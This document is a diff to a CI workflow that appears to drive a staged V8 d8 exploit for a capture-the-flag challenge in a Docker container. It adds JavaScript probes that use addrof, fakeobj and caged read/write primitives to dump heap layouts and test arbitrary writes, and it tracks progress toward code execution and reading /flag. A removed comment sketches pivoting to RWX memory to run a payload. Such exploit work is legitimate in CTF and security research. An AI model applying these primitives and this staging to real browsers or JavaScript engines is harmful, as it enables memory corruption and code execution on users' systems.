@@ -3932,6 +3932,7 @@ jobs:
           exit 0
 
 
+
       - name: Test 10 — Stage B absolute R/W probe (layout dump)
         id: stage_b
         run: |
@@ -3941,14 +3942,53 @@ jobs:
           banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
           banner "TEST 10 / STAGE B — absolute R/W probe (layout measurement)"
-          if ! docker exec "$CONTAINER" true 2>/dev/null; then docker start "$CONTAINER" 2>/dev/null || true; sleep 1; fi
+          mkdir -p /tmp/out
+          # Ensure container is up
+          if ! docker exec "$CONTAINER" true 2>/dev/null; then
+            log "restarting container"
+            docker start "$CONTAINER" 2>&1 || true
+            sleep 2
+          fi
+          if ! docker exec "$CONTAINER" true 2>/dev/null; then
+            log "FATAL: container dead"
+            echo "LAYOUT_DUMP_OK=0" | tee /tmp/out/test10.result
+            echo "ABS_RW_OK=0" | tee -a /tmp/out/test10.result
+            echo "test10_rc=99" | tee -a /tmp/out/test10.result
+            exit 0
+          fi
+          # Rebuild poly base if missing on host
+          if [ ! -f /tmp/poc_test_poly.js ]; then
+            log "rebuilding poc_test_poly.js on host"
+            if [ -f /tmp/poc_test.js ]; then
+              { echo 'if (typeof print === "undefined") { globalThis.print = function(){ console.log.apply(console, arguments); }; }'; cat /tmp/poc_test.js; } > /tmp/poc_test_poly.js
+            else
+              log "FATAL: no poc_test.js on host"
+              echo "LAYOUT_DUMP_OK=0" | tee /tmp/out/test10.result
+              echo "ABS_RW_OK=0" | tee -a /tmp/out/test10.result
+              exit 0
+            fi
+          fi
+          # Build Stage B script: poly PoC with crash stripped, probe appended so dump always finishes
           python3 - <<'PY'
           from pathlib import Path
+          import re
           base = Path("/tmp/poc_test_poly.js").read_text()
+          # Remove final caged_write_unsafe(...) call so probe can complete with rc=0
+          base = re.sub(
+              r"caged_write_unsafe\s*\([^;]*\)\s*;?",
+              "/* caged_write_unsafe stripped for Stage B layout dump */",
+              base,
+          )
           probe = r"""
-          // ===== STAGE B: layout / absolute R/W probe =====
+          // ===== STAGE B: layout / absolute R/W probe (no crash) =====
           (function stageB() {
             print("[*] STAGE_B_BEGIN");
+            if (typeof instance === "undefined" || !instance.exports) {
+              print("[-] STAGE_B_NO_INSTANCE");
+              print("[*] ABS_RW_OK=0");
+              print("[*] STAGE_B_END");
+              return;
+            }
             let {addrof, fakeobj, caged_read, caged_write} = instance.exports;
             function safe_read(off) {
               try { return caged_read(off|0)|0; } catch (e) { return null; }
@@ -3977,8 +4017,7 @@ jobs:
               print("[+] addrof(" + name + ")=" + (a>>>0) + " " + hex(a));
               let line = name + " @" + hex(a) + " :";
               for (let d = -0x40; d <= 0x80; d += 4) {
-                let off = (a + d)|0;
-                let v = safe_read(off);
+                let v = safe_read((a + d)|0);
                 if (v === null) continue;
                 line += " [" + d + "]=" + hex(v);
               }
@@ -3989,49 +4028,89 @@ jobs:
             let ab2 = new ArrayBuffer(0x200);
             let u32b = new Uint32Array(ab2);
             u32b[0] = 0xBEEF0001;
-            let a2 = addrof(ab2)|0;
+            let a2 = 0;
+            try { a2 = addrof(ab2)|0; } catch (e) { print("[!] addrof ab2 failed: " + e); }
             print("[+] addrof(ab2)=" + hex(a2));
             for (let d = -0x40; d <= 0x100; d += 4) {
               let v = safe_read((a2 + d)|0);
               if (v === null) continue;
               print("  ab2[" + d + "]=" + hex(v));
             }
-            print("[*] STAGE_B_ABS_RW_ATTEMPT");
-            let ABS_RW_OK = 0;
+            // Cage write smoke at known good offset from prior tests (addrof of ab)
+            print("[*] STAGE_B_CAGE_WRITE_SMOKE");
+            let smoke_ok = 0;
+            try {
+              let off = addrof(ab)|0;
+              let before = safe_read(off);
+              caged_write(off|0, 0x41424344);
+              let after = safe_read(off);
+              print("[*] smoke off=" + hex(off) + " before=" + before + " after=" + after);
+              if ((after|0) === (0x41424344|0)) {
+                print("[+] STAGE_B_CAGE_WRITE_OK");
+                smoke_ok = 1;
+              }
+            } catch (e) {
+              print("[!] cage write smoke failed: " + e);
+            }
+            let ABS_RW_OK = 0;  // absolute R/W needs measured offsets; not claimed here
             if (dumps >= 4) {
               print("[+] STAGE_B_LAYOUT_DUMP_OK objects=" + dumps);
             } else {
-              print("[-] STAGE_B_LAYOUT_DUMP_INCOMPLETE");
+              print("[-] STAGE_B_LAYOUT_DUMP_INCOMPLETE objects=" + dumps);
             }
-            print("[*] ABS_RW_OK=" + ABS_RW_OK + " (0=measurement-only; set after RE on this d8)");
+            print("[*] ABS_RW_OK=" + ABS_RW_OK);
+            print("[*] STAGE_B_CAGE_SMOKE=" + smoke_ok);
             print("[*] STAGE_B_END");
           })();
-          """)
-          out = base
-          idx = out.rfind("caged_write_unsafe")
-          if idx != -1:
-              line_start = out.rfind("\n", 0, idx)
-              if line_start == -1:
-                  line_start = 0
-              out = out[:line_start] + "\n" + probe + "\n" + out[line_start:]
-          else:
-              out = out + "\n" + probe + "\n"
+          """
+          out = base + "\n" + probe + "\n"
           Path("/tmp/poc_stage_b.js").write_text(out)
-          print("stage_b bytes", Path("/tmp/poc_stage_b.js").stat().st_size)
+          print("stage_b_bytes", Path("/tmp/poc_stage_b.js").stat().st_size)
           PY
-          docker cp /tmp/poc_stage_b.js "$CONTAINER":/tmp/poc_stage_b.js
-          docker exec "$CONTAINER" sh -c 'sha256sum /tmp/poc_stage_b.js; ls -la /tmp/poc_stage_b.js'
+          if [ ! -f /tmp/poc_stage_b.js ]; then
+            log "FATAL: host failed to write /tmp/poc_stage_b.js"
+            echo "LAYOUT_DUMP_OK=0" | tee /tmp/out/test10.result
+            echo "ABS_RW_OK=0" | tee -a /tmp/out/test10.result
+            exit 0
+          fi
+          log "host stage_b sha256=$(sha256sum /tmp/poc_stage_b.js | awk '{print $1}') bytes=$(wc -c < /tmp/poc_stage_b.js)"
+          # Transfer: docker cp, verify; fallback base64 pipe
+          docker cp /tmp/poc_stage_b.js "$CONTAINER":/tmp/poc_stage_b.js 2>&1 | tee /tmp/out/test10_cp.txt
+          IN_CT=0
+          if docker exec "$CONTAINER" sh -c 'test -f /tmp/poc_stage_b.js && test -s /tmp/poc_stage_b.js'; then
+            IN_CT=1
+            log "docker cp OK: $(docker exec "$CONTAINER" sha256sum /tmp/poc_stage_b.js)"
+          else
+            log "docker cp failed or empty — base64 fallback"
+            base64 -w0 /tmp/poc_stage_b.js > /tmp/poc_stage_b.b64
+            docker exec -i "$CONTAINER" sh -c 'base64 -d > /tmp/poc_stage_b.js' < /tmp/poc_stage_b.b64
+            if docker exec "$CONTAINER" sh -c 'test -s /tmp/poc_stage_b.js'; then
+              IN_CT=1
+              log "base64 transfer OK: $(docker exec "$CONTAINER" sha256sum /tmp/poc_stage_b.js)"
+            else
+              log "FATAL: could not place poc_stage_b.js in container"
+            fi
+          fi
+          echo "STAGE_B_IN_CONTAINER=$IN_CT" | tee /tmp/out/test10.result
+          if [ "$IN_CT" -ne 1 ]; then
+            echo "LAYOUT_DUMP_OK=0" | tee -a /tmp/out/test10.result
+            echo "ABS_RW_OK=0" | tee -a /tmp/out/test10.result
+            echo "test10_rc=98" | tee -a /tmp/out/test10.result
+            exit 0
+          fi
           docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_stage_b.js' > /tmp/out/test10.stdout 2> /tmp/out/test10.stderr
           RC=$?
-          echo "test10_rc=$RC" | tee /tmp/out/test10.result
+          echo "test10_rc=$RC" | tee -a /tmp/out/test10.result
           cat /tmp/out/test10.stdout /tmp/out/test10.stderr > /tmp/out/test10.combined
           echo "===== STAGE B combined (tail) ====="
-          tail -120 /tmp/out/test10.combined
+          tail -150 /tmp/out/test10.combined
           LAYOUT=0; grep -q 'STAGE_B_LAYOUT_DUMP_OK' /tmp/out/test10.combined && LAYOUT=1
           ABS=0; grep -q 'ABS_RW_OK=1' /tmp/out/test10.combined && ABS=1
+          SMOKE=0; grep -q 'STAGE_B_CAGE_WRITE_OK' /tmp/out/test10.combined && SMOKE=1
           echo "LAYOUT_DUMP_OK=$LAYOUT" | tee -a /tmp/out/test10.result
           echo "ABS_RW_OK=$ABS" | tee -a /tmp/out/test10.result
-          log "Stage B LAYOUT_DUMP_OK=$LAYOUT ABS_RW_OK=$ABS rc=$RC"
+          echo "CAGE_SMOKE_OK=$SMOKE" | tee -a /tmp/out/test10.result
+          log "Stage B LAYOUT_DUMP_OK=$LAYOUT ABS_RW_OK=$ABS CAGE_SMOKE=$SMOKE rc=$RC in_container=$IN_CT"
           exit 0
 
       - name: Test 11 — Stage C in-process exec marker (informational)
@@ -4042,48 +4121,58 @@ jobs:
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
           banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
-          banner "TEST 11 / STAGE C — exec marker attempt (requires Stage B abs R/W)"
-          if ! docker exec "$CONTAINER" true 2>/dev/null; then docker start "$CONTAINER" 2>/dev/null || true; sleep 1; fi
+          banner "TEST 11 / STAGE C — exec marker (requires abs R/W; skipped until then)"
+          mkdir -p /tmp/out
+          if ! docker exec "$CONTAINER" true 2>/dev/null; then docker start "$CONTAINER" 2>/dev/null || true; sleep 2; fi
+          if [ ! -f /tmp/poc_test_poly.js ] && [ -f /tmp/poc_test.js ]; then
+            { echo 'if (typeof print === "undefined") { globalThis.print = function(){ console.log.apply(console, arguments); }; }'; cat /tmp/poc_test.js; } > /tmp/poc_test_poly.js
+          fi
           python3 - <<'PY'
           from pathlib import Path
+          import re
           base = Path("/tmp/poc_test_poly.js").read_text()
+          base = re.sub(
+              r"caged_write_unsafe\s*\([^;]*\)\s*;?",
+              "/* caged_write_unsafe stripped for Stage C */",
+              base,
+          )
           probe = r"""
           // ===== STAGE C: exec marker (only if absolute R/W available) =====
           (function stageC() {
             print("[*] STAGE_C_BEGIN");
-            // Without verified absolute R/W offsets this stage is a deliberate no-op.
-            // When ABS_RW is implemented for this d8, replace the body with code that:
-            //   retargets TypedArray backing store to RWX or JSFunction code,
-            //   writes a payload, invokes it, and prints PWNED_MARKER=<nonce>.
+            // Honest no-op until ABS_RW_OK is implemented with measured offsets for this d8.
             let nonce = "pwn_" + (0xC0DEC0DE >>> 0).toString(16);
             print("[*] STAGE_C_SKIPPED reason=no_verified_abs_rw nonce_would_be=" + nonce);
             print("[*] EXEC_MARKER_OK=0");
             print("[*] STAGE_C_END");
           })();
-          """)
-          out = base
-          idx = out.rfind("caged_write_unsafe")
-          if idx != -1:
-              line_start = out.rfind("\n", 0, idx)
-              if line_start == -1:
-                  line_start = 0
-              out = out[:line_start] + "\n" + probe + "\n" + out[line_start:]
-          else:
-              out = out + "\n" + probe
-          Path("/tmp/poc_stage_c.js").write_text(out)
-          print("stage_c bytes", Path("/tmp/poc_stage_c.js").stat().st_size)
+          """
+          Path("/tmp/poc_stage_c.js").write_text(base + "\n" + probe + "\n")
+          print("stage_c_bytes", Path("/tmp/poc_stage_c.js").stat().st_size)
           PY
-          docker cp /tmp/poc_stage_c.js "$CONTAINER":/tmp/poc_stage_c.js
-          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_stage_c.js' > /tmp/out/test11.stdout 2> /tmp/out/test11.stderr
-          RC=$?
-          cat /tmp/out/test11.stdout /tmp/out/test11.stderr > /tmp/out/test11.combined
+          docker cp /tmp/poc_stage_c.js "$CONTAINER":/tmp/poc_stage_c.js 2>&1 || true
+          if ! docker exec "$CONTAINER" sh -c 'test -s /tmp/poc_stage_c.js'; then
+            log "base64 fallback for stage_c"
+            base64 -w0 /tmp/poc_stage_c.js | docker exec -i "$CONTAINER" sh -c 'base64 -d > /tmp/poc_stage_c.js'
+          fi
+          IN_CT=0
+          docker exec "$CONTAINER" sh -c 'test -s /tmp/poc_stage_c.js' && IN_CT=1
+          echo "STAGE_C_IN_CONTAINER=$IN_CT" | tee /tmp/out/test11.result
+          if [ "$IN_CT" -eq 1 ]; then
+            docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_stage_c.js' > /tmp/out/test11.stdout 2> /tmp/out/test11.stderr
+            RC=$?
+            cat /tmp/out/test11.stdout /tmp/out/test11.stderr > /tmp/out/test11.combined
+          else
+            RC=98
+            echo "Error: poc_stage_c.js missing in container" > /tmp/out/test11.combined
+          fi
+          echo "test11_rc=$RC" | tee -a /tmp/out/test11.result
           tail -80 /tmp/out/test11.combined
           EXEC=0; grep -q 'EXEC_MARKER_OK=1' /tmp/out/test11.combined && EXEC=1
           SKIP=0; grep -q 'STAGE_C_SKIPPED' /tmp/out/test11.combined && SKIP=1
-          echo "EXEC_MARKER_OK=$EXEC" | tee /tmp/out/test11.result
+          echo "EXEC_MARKER_OK=$EXEC" | tee -a /tmp/out/test11.result
           echo "STAGE_C_SKIPPED=$SKIP" | tee -a /tmp/out/test11.result
-          echo "test11_rc=$RC" | tee -a /tmp/out/test11.result
-          log "Stage C EXEC_MARKER_OK=$EXEC SKIPPED=$SKIP (informational)"
+          log "Stage C EXEC_MARKER_OK=$EXEC SKIPPED=$SKIP in_container=$IN_CT"
           exit 0
 
       - name: Test 12 — Stage D flag path (real /flag or labeled sim)
@@ -4234,10 +4323,13 @@ jobs:
           MULTI=$(grep -oE 'MULTI_MARKER_HITS=[0-9]+' /tmp/out/test9.result 2>/dev/null | head -1 | cut -d= -f2); MULTI=${MULTI:-0}
           LAYOUT=0; grep -q 'LAYOUT_DUMP_OK=1' /tmp/out/test10.result 2>/dev/null && LAYOUT=1
           ABS=0; grep -q 'ABS_RW_OK=1' /tmp/out/test10.result 2>/dev/null && ABS=1
+          SMOKE=0; grep -q 'CAGE_SMOKE_OK=1' /tmp/out/test10.result 2>/dev/null && SMOKE=1
+          B_IN=0; grep -q 'STAGE_B_IN_CONTAINER=1' /tmp/out/test10.result 2>/dev/null && B_IN=1
           EXEC=0; grep -q 'EXEC_MARKER_OK=1' /tmp/out/test11.result 2>/dev/null && EXEC=1
+          SKIP=0; grep -q 'STAGE_C_SKIPPED=1' /tmp/out/test11.result 2>/dev/null && SKIP=1
           REALF=0; grep -q 'REAL_FLAG_HIT=1' /tmp/out/test12.result 2>/dev/null && REALF=1
           SIMF=0; grep -q 'CATFLAG_PROTOCOL_SIM=1' /tmp/out/test12.result 2>/dev/null && SIMF=1
-          log "EXTRA FLAG=$FLAG EXT=$EXT FILEB=$FILEB MULTI=$MULTI LAYOUT=$LAYOUT ABS=$ABS EXEC=$EXEC REALF=$REALF SIMF=$SIMF"
+          log "EXTRA FLAG=$FLAG EXT=$EXT FILEB=$FILEB MULTI=$MULTI LAYOUT=$LAYOUT ABS=$ABS SMOKE=$SMOKE B_IN=$B_IN EXEC=$EXEC SKIP=$SKIP REALF=$REALF SIMF=$SIMF"
           {
             echo ""
             echo "### Extra tests (L1)"
@@ -4247,9 +4339,11 @@ jobs:
             echo "- Multi-marker crash hits: $MULTI"
             echo ""
             echo "### Exploitation stages"
+            echo "- **L2 Stage B** script in container: $B_IN"
             echo "- **L2 Stage B** layout dump OK: $LAYOUT"
+            echo "- **L2 Stage B** cage write smoke OK: $SMOKE"
             echo "- **L2 Stage B** absolute R/W OK: $ABS (requires measured offsets)"
-            echo "- **L3 Stage C** exec marker OK: $EXEC (requires abs R/W)"
+            echo "- **L3 Stage C** exec marker OK: $EXEC / skipped: $SKIP"
             echo "- **L4 Stage D** REAL flag via existing /flag: $REALF"
             echo "- **L4 Stage D** protocol sim only (not exploit): $SIMF"
           } >> "$GITHUB_STEP_SUMMARY"
